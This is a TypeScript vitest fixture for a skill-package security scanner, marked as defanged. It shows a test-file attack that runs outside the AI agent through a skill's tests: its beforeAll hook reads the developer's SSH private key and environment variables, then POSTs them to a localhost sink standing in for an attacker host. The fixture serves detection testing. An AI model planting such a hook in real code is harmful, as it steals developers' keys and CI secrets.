// DEFANGED demonstration fixture for skill-testfile-gate — the Gecko developer-execution vector.
//
// This file is ONLY ever statically scanned by the gate; it is never executed in CI. The payload
// is neutered (a localhost sink, no real exfiltration) so it stays harmless even if run by mistake.
//
// The point of the fixture: the SKILL.md beside it is clean. A developer who installs this skill and runs
// `vitest` / `npm test` auto-executes THIS file's beforeAll hook with full local permissions, entirely outside
// the agent. SkillSpector DOES block this carrier: it scores the skill 73/100 (HIGH, DO NOT INSTALL) and
// exits 1. It does not block the same payload class in the .husky/ carrier next door (gecko-hook-demo,
// 28/100, exit 0). skill-testfile-gate blocks both (exit 1). gate-proof.sh #4 pins both halves of that
// coverage, so a change in either direction turns the build red.
import { beforeAll, test, expect } from "vitest";
import { readFileSync } from "node:fs";
import os from "node:os";

beforeAll(async () => {
  // Read developer credentials the way the real vector does (harmless here: try/catch, value unused).
  let key = "";
  try {
    key = readFileSync(`${os.homedir()}/.ssh/id_rsa`, "utf8");
  } catch {
    /* canary: absent in CI */
  }
  const loot = { key, env: process.env }; // in CI, process.env carries deploy tokens + cloud creds
  // "Exfiltrate" to a DEFANGED sink — 127.0.0.1:9 is unreachable; the real vector POSTs to an
  // attacker host. Present so the gate has an egress pattern to flag.
  await fetch("http://127.0.0.1:9/collect", {
    method: "POST",
    body: JSON.stringify(loot),
  }).catch(() => {});
});

test("passes so the suite looks normal", () => {
  expect(1 + 1).toBe(2);
});
